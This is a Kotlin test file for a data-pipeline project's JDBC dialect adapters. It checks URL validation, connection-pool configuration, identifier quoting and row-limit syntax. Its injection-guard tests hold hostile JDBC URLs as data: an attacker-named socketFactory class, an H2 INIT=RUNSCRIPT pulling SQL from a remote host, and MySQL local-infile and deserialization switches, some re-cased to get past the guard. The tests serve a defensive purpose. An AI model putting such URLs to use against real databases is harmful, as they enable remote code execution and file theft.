package co.datapipelines.datasources

import co.datapipelines.typesystem.Dialect
import co.datapipelines.typesystem.TypeMappers
import com.zaxxer.hikari.HikariConfig
import com.zaxxer.hikari.HikariDataSource
import io.kotest.assertions.throwables.shouldThrow
import io.kotest.matchers.collections.shouldContainExactlyInAnyOrder
import io.kotest.matchers.shouldBe
import io.kotest.matchers.string.shouldContain
import io.mockk.every
import io.mockk.mockk
import org.junit.jupiter.api.Test

/**
 * [DialectAdapter] behavior: registry completeness, driver/type-mapper wiring, JDBC-URL
 * validation, the injection guard, and verbatim `HikariConfig` passthrough (datasources.md
 * §4.2, §6.1, §13.2).
 */
class DialectAdaptersTest {
    @Test
    fun `every dialect has an adapter and none is duplicated`() {
        DialectAdapters.all().map { it.dialect } shouldContainExactlyInAnyOrder Dialect.entries.toList()
    }

    @Test
    fun `each adapter wires the driver class and type mapper for its dialect`() {
        Dialect.entries.forEach { dialect ->
            val adapter = DialectAdapters.forDialect(dialect)
            adapter.jdbcDriverClassName shouldBe JdbcDrivers.classNameFor(dialect)
            adapter.typeMapper shouldBe TypeMappers.forDialect(dialect)
        }
    }

    @Test
    fun `every dialect declares an introspection table-type vocabulary and system-schema exclusion`() {
        // §7A: the vocabulary is a per-dialect property, not a hardcoded constant — every
        // adapter must carry one, and matching against the exclusion is case-insensitive.
        DialectAdapters.all().forEach { adapter ->
            assert(adapter.introspectionTableTypes.isNotEmpty()) { "${adapter.dialect} has no table-type vocabulary" }
            assert(adapter.introspectionSystemSchemas.all { it == it.lowercase() }) {
                "${adapter.dialect} system schemas must be declared lowercase"
            }
        }
        // Postgres carries the extra user-data types beyond TABLE/VIEW...
        DialectAdapters.forDialect(Dialect.POSTGRES).introspectionTableTypes shouldContainExactlyInAnyOrder
            listOf("TABLE", "VIEW", "PARTITIONED TABLE", "MATERIALIZED VIEW", "FOREIGN TABLE")
        // ...and excludes its system catalogs.
        DialectAdapters.forDialect(Dialect.POSTGRES).introspectionSystemSchemas shouldContainExactlyInAnyOrder
            listOf("pg_catalog", "information_schema")
        // Every dialect that HAS an information_schema excludes at least the SQL-standard
        // system schema. Oracle is the exception by design: it has no such schema, so the
        // entry there would be dead weight (R4).
        Dialect.entries.filter { it != Dialect.POSTGRES && it != Dialect.ORACLE }.forEach { dialect ->
            ("information_schema" in DialectAdapters.forDialect(dialect).introspectionSystemSchemas) shouldBe true
        }
        // MySQL: Connector/J reports the sys/performance_schema/mysql schemas as plain TABLE/
        // VIEW rows — the type vocabulary CANNOT catch them, only the schema list can.
        DialectAdapters.forDialect(Dialect.MYSQL).introspectionSystemSchemas shouldContainExactlyInAnyOrder
            listOf("information_schema", "mysql", "performance_schema", "sys")
        // Oracle: the instance's administrative schemas. A FLOOR, known-incomplete — no
        // information_schema (Oracle has none), and `apex_*` is the one prefix entry (Oracle
        // versions its APEX schemas: APEX_220200, APEX_240100, ...).
        DialectAdapters.forDialect(Dialect.ORACLE).introspectionSystemSchemas shouldContainExactlyInAnyOrder
            setOf(
                "sys",
                "system",
                "outln",
                "xdb",
                "ctxsys",
                "mdsys",
                "ordsys",
                "dbsnmp",
                "wmsys",
                "audsys",
                "olapsys",
                "xs\$null",
                "apex_*",
            )
        // MSSQL: the hidden schemas beside INFORMATION_SCHEMA, plus the built-in fixed-role/
        // special schemas present in every SQL Server database (R3 F3). A FLOOR, like Oracle's.
        DialectAdapters.forDialect(Dialect.MSSQL).introspectionSystemSchemas shouldContainExactlyInAnyOrder
            setOf(
                "information_schema",
                "sys",
                "db_owner",
                "db_accessadmin",
                "db_securityadmin",
                "db_ddladmin",
                "db_backupoperator",
                "db_datareader",
                "db_datawriter",
                "db_denydatareader",
                "db_denydatawriter",
                "guest",
            )
        // DuckDB is Postgres-lineage: its engine catalogs report as plain rows (verified against
        // the pinned duckdb_jdbc 1.5.5.1 — getSchemas() returns main, information_schema,
        // pg_catalog), so the bare {information_schema} default leaks pg_catalog.
        DialectAdapters.forDialect(Dialect.DUCKDB).introspectionSystemSchemas shouldContainExactlyInAnyOrder
            setOf("information_schema", "pg_catalog")
    }

    @Test
    fun `a trailing star entry matches by case-insensitive prefix`() {
        // Oracle's APEX schemas are version-prefixed (APEX_220200, ...) — an exact-name entry
        // could never enumerate them. `apex_*` means: every schema whose lowercase name starts
        // with `apex_`. Verified through the introspector's row filter, where the matching
        // lives.
        val meta = mockk<java.sql.DatabaseMetaData>()
        val tablesRs = mockk<java.sql.ResultSet>(relaxed = true)
        every { meta.searchStringEscape } returns "\\"
        every { meta.getTables(null, null, "%", any<Array<String>>()) } returns tablesRs
        every { tablesRs.next() } returns true andThen true andThen true andThen false
        every { tablesRs.getString("TABLE_SCHEM") } returns "APEX_240100" andThen "ORDSYS" andThen "SALES"
        every { tablesRs.getString("TABLE_NAME") } returns "t"
        every { tablesRs.getString("TABLE_TYPE") } returns "TABLE"
        val (introspector, name) = introspectorOver(Dialect.ORACLE, meta)

        introspector.tables(name).tables.map { it.schema } shouldBe listOf("SALES")
    }

    @Test
    fun `a well-formed URL for the dialect passes`() {
        DialectAdapters
            .forDialect(Dialect.POSTGRES)
            .validateJdbcUrl("jdbc:postgresql://db.internal:5432/app?sslmode=verify-full")
            .valid shouldBe true
        DialectAdapters
            .forDialect(Dialect.MSSQL)
            .validateJdbcUrl("jdbc:sqlserver://db.internal:1433;databaseName=app;encrypt=true")
            .valid shouldBe true
    }

    @Test
    fun `a URL whose scheme does not match the dialect is rejected as scheme_invalid`() {
        val result = DialectAdapters.forDialect(Dialect.POSTGRES).validateJdbcUrl("jdbc:mysql://h/db")

        result.valid shouldBe false
        result.errors.single().code shouldBe DatasourceErrorCodes.JDBC_URL_SCHEME_INVALID
    }

    @Test
    fun `a URL that does not start with jdbc is scheme_invalid`() {
        DialectAdapters
            .forDialect(Dialect.POSTGRES)
            .validateJdbcUrl("postgresql://h/db")
            .errors
            .single()
            .code shouldBe DatasourceErrorCodes.JDBC_URL_SCHEME_INVALID
    }

    @Test
    fun `a URL with the right scheme but empty sub-name is malformed`() {
        DialectAdapters
            .forDialect(Dialect.POSTGRES)
            .validateJdbcUrl("jdbc:postgresql:")
            .errors
            .single()
            .code shouldBe DatasourceErrorCodes.JDBC_URL_MALFORMED
    }

    @Test
    fun `injection-surface properties smuggled into the URL are refused`() {
        // PostgreSQL socketFactory loads an attacker-named class.
        assertMalformed(Dialect.POSTGRES, "jdbc:postgresql://h/db?socketFactory=evil.Factory")
        // H2 INIT runs arbitrary SQL at connect (RUNSCRIPT).
        assertMalformed(Dialect.H2, "jdbc:h2:mem:t;INIT=RUNSCRIPT FROM 'http://x/e.sql'")
        // MySQL local-infile / gadget-deserialization switches.
        assertMalformed(Dialect.MYSQL, "jdbc:mysql://h/db?allowLoadLocalInfile=true")
        assertMalformed(Dialect.MYSQL, "jdbc:mysql://h/db?autoDeserialize=true")
    }

    @Test
    fun `the URL injection guard matches property names case-insensitively`() {
        // Driver property lookup is case-insensitive, so a case-sensitive guard would be bypassed
        // by 'SocketFactory' / 'init'. Without this case the guard assertions above would pass a
        // case-sensitive implementation too.
        assertMalformed(Dialect.POSTGRES, "jdbc:postgresql://h/db?SocketFactory=evil.Factory")
        assertMalformed(Dialect.POSTGRES, "jdbc:postgresql://h/db?SOCKETFACTORY=evil.Factory")
        assertMalformed(Dialect.H2, "jdbc:h2:mem:t;init=RUNSCRIPT FROM 'http://x/e.sql'")
        assertMalformed(Dialect.MYSQL, "jdbc:mysql://h/db?AllowLoadLocalInfile=true")
    }

    @Test
    fun `the URL scheme match is case-insensitive but still dialect-specific`() {
        DialectAdapters.forDialect(Dialect.POSTGRES).validateJdbcUrl("JDBC:POSTGRESQL://h/db").valid shouldBe true
    }

    @Test
    fun `a valid hikari property reaches HikariConfig verbatim`() {
        val datasource =
            Fixtures.h2(properties = DatasourceProperties(hikari = mapOf("maximumPoolSize" to 7, "minimumIdle" to 3)))

        val config = DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(datasource)

        config.maximumPoolSize shouldBe 7
        config.minimumIdle shouldBe 3
        config.jdbcUrl shouldBe datasource.jdbcUrl
        config.driverClassName shouldBe JdbcDrivers.classNameFor(Dialect.H2)
    }

    @Test
    fun `a jdbc property is applied as a driver connection property, defaults first`() {
        val datasource =
            Fixtures.h2(properties = DatasourceProperties(jdbc = mapOf("ACCESS_MODE_DATA" to "r")))

        val config = DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(datasource)

        config.dataSourceProperties.getProperty("ACCESS_MODE_DATA") shouldBe "r"
    }

    @Test
    fun `minimumIdle defaults to the documented 2, not to HikariCP's maximumPoolSize`() {
        // §5's table publishes minimumIdle = 2. HikariCP's own default is "same as
        // maximumPoolSize" (10), so leaving it unset would keep 5x the documented number of
        // connections warm against every source database.
        val config = DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(Fixtures.h2())

        config.minimumIdle shouldBe AbstractDialectAdapter.DEFAULT_MINIMUM_IDLE
        config.minimumIdle shouldBe 2
    }

    @Test
    fun `a readonly datasource's pool is built with Hikari readOnly - on a REAL pool build`() {
        // Workspaces design §6 layer 2b (D6), proved on a real HikariConfig AND a real
        // HikariDataSource constructed from it (assertion on a mocked adapter would prove the
        // mock): `initializationFailTimeout = -1` keeps the build connect-free.
        val config = DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(Fixtures.h2(isReadonly = true))
        config.isReadOnly shouldBe true

        config.initializationFailTimeout = -1
        HikariDataSource(config).use { pool -> pool.isReadOnly shouldBe true }
    }

    @Test
    fun `a writable datasource's pool is not flagged readOnly`() {
        val config = DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(Fixtures.h2())

        config.isReadOnly shouldBe false
    }

    @Test
    fun `an explicit minimumIdle is preserved, including the documented zero`() {
        val explicit = Fixtures.h2(properties = DatasourceProperties(hikari = mapOf("minimumIdle" to 7)))
        DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(explicit).minimumIdle shouldBe 7

        // 0 is a legitimate operator choice (keep nothing warm) and must not be mistaken for
        // "unset" — a null/zero-based check for the default would silently overwrite it with 2.
        val noneWarm = Fixtures.h2(properties = DatasourceProperties(hikari = mapOf("minimumIdle" to 0)))
        DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(noneWarm).minimumIdle shouldBe 0
    }

    @Test
    fun `a mis-cased hikari property is rejected - HikariCP resolves names case-sensitively`() {
        // Verified against the pinned HikariCP: PropertyElf.setProperty throws "Property
        // minimumidle does not exist on target class". Recorded as a test because the §5.6
        // denylists deliberately match case-INsensitively (a refused key must not be bypassable
        // by re-casing), and the two rules are easy to conflate.
        val result =
            DatasourceValidator().validate(
                Fixtures.h2(properties = DatasourceProperties(hikari = mapOf("minimumidle" to 5))),
                isCreate = true,
            )

        result.errors.single { it.code == DatasourceErrorCodes.PROPERTIES_INVALID }.field shouldContain "minimumidle"
    }

    @Test
    fun `query_timeout_seconds is not a pool property - Hikari timeouts stay at their defaults`() {
        // §5.5: the query timeout is an execution-layer, per-statement policy applied by the
        // executor. Leaking it into connectionTimeout or validationTimeout would silently change
        // how long a lease waits. (The positive precedence test lives with the executor.)
        val defaults = HikariConfig()
        val datasource = Fixtures.h2(queryTimeoutSeconds = 45)

        val config = DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(datasource)

        config.connectionTimeout shouldBe defaults.connectionTimeout
        config.validationTimeout shouldBe defaults.validationTimeout
        config.maxLifetime shouldBe defaults.maxLifetime
        config.idleTimeout shouldBe defaults.idleTimeout
    }

    @Test
    fun `building a pool without a plaintext password is refused, not silently blank`() {
        // DS-SEC-10: `password ?: ""` would have opened a real connection with an empty
        // credential — against a DB that allows blank passwords, silently succeeding.
        val thrown =
            shouldThrow<IllegalArgumentException> {
                DialectAdapters.forDialect(Dialect.H2).buildHikariConfig(Fixtures.h2(password = null))
            }

        thrown.message.orEmpty() shouldContain "test_h2"
    }

    @Test
    fun `every dialect declares its identifier quote style - enum-total`() {
        // Datasources §7B: the mapping is total over the enum (forDialect cannot return null),
        // and the three styles are pinned to exactly the dialects that carry them — a new
        // dialect lands in the default DOUBLE_QUOTE bucket and is forced to choose here.
        val styles = Dialect.entries.associate { it to DialectAdapters.forDialect(it).identifierQuoteStyle }

        styles.size shouldBe Dialect.entries.size
        styles[Dialect.MYSQL] shouldBe IdentifierQuoteStyle.BACKTICK
        styles[Dialect.MSSQL] shouldBe IdentifierQuoteStyle.BRACKET
        styles[Dialect.ORACLE] shouldBe IdentifierQuoteStyle.DOUBLE_QUOTE
        styles[Dialect.POSTGRES] shouldBe IdentifierQuoteStyle.DOUBLE_QUOTE
        styles[Dialect.H2] shouldBe IdentifierQuoteStyle.DOUBLE_QUOTE
        styles[Dialect.DUCKDB] shouldBe IdentifierQuoteStyle.DOUBLE_QUOTE
        styles[Dialect.SQLITE] shouldBe IdentifierQuoteStyle.DOUBLE_QUOTE
    }

    @Test
    fun `quoteIdentifier doubles the dialect's own quote character`() {
        // The doubling is the injection boundary: a caller-supplied identifier containing the
        // quote character must not be able to close the identifier and open SQL. Each style
        // exercises its own escape, including the bracket `]]` fold.
        DialectAdapters.forDialect(Dialect.POSTGRES).quoteIdentifier("""we"ird""") shouldBe "\"we\"\"ird\""
        DialectAdapters.forDialect(Dialect.ORACLE).quoteIdentifier("plain") shouldBe "\"plain\""
        DialectAdapters.forDialect(Dialect.MYSQL).quoteIdentifier("or`der") shouldBe "`or``der`"
        DialectAdapters.forDialect(Dialect.MSSQL).quoteIdentifier("sc]hema") shouldBe "[sc]]hema]"
        DialectAdapters.forDialect(Dialect.H2).quoteIdentifier("t") shouldBe "\"t\""
    }

    @Test
    fun `every dialect applies its row limit in its own syntax - enum-total`() {
        val limits = Dialect.entries.associate { it to DialectAdapters.forDialect(it).rowLimitStyle }

        limits[Dialect.POSTGRES] shouldBe RowLimitStyle.LIMIT
        limits[Dialect.MYSQL] shouldBe RowLimitStyle.LIMIT
        limits[Dialect.H2] shouldBe RowLimitStyle.LIMIT
        limits[Dialect.DUCKDB] shouldBe RowLimitStyle.LIMIT
        limits[Dialect.SQLITE] shouldBe RowLimitStyle.LIMIT
        limits[Dialect.ORACLE] shouldBe RowLimitStyle.FETCH_FIRST
        limits[Dialect.MSSQL] shouldBe RowLimitStyle.TOP
    }

    @Test
    fun `applyRowLimit builds each dialect's clause from a whole statement`() {
        val sql = "SELECT * FROM \"t\" ORDER BY \"c\""

        DialectAdapters.forDialect(Dialect.POSTGRES).applyRowLimit(sql, 5) shouldBe "$sql LIMIT 5"
        DialectAdapters.forDialect(Dialect.MYSQL).applyRowLimit(sql, 1) shouldBe "$sql LIMIT 1"
        // Oracle 12c+: FETCH FIRST, never ROWNUM (pre-sort assignment — see the adapter KDoc).
        DialectAdapters.forDialect(Dialect.ORACLE).applyRowLimit(sql, 10) shouldBe "$sql FETCH FIRST 10 ROWS ONLY"
        // MSSQL's TOP sits AFTER the SELECT keyword, not at the end — the reason this is a
        // whole-statement method rather than a suffix.
        DialectAdapters
            .forDialect(Dialect.MSSQL)
            .applyRowLimit(sql, 7) shouldBe "SELECT TOP (7) * FROM \"t\" ORDER BY \"c\""
    }

    @Test
    fun `applyRowLimit tolerates leading whitespace and lowercase select for the TOP dialect`() {
        DialectAdapters
            .forDialect(Dialect.MSSQL)
            .applyRowLimit("  select a from t", 3) shouldBe "SELECT TOP (3) a from t"
    }

    private fun assertMalformed(
        dialect: Dialect,
        url: String,
    ) {
        val result = DialectAdapters.forDialect(dialect).validateJdbcUrl(url)
        result.valid shouldBe false
        result.errors.single().code shouldBe DatasourceErrorCodes.JDBC_URL_MALFORMED
    }
}
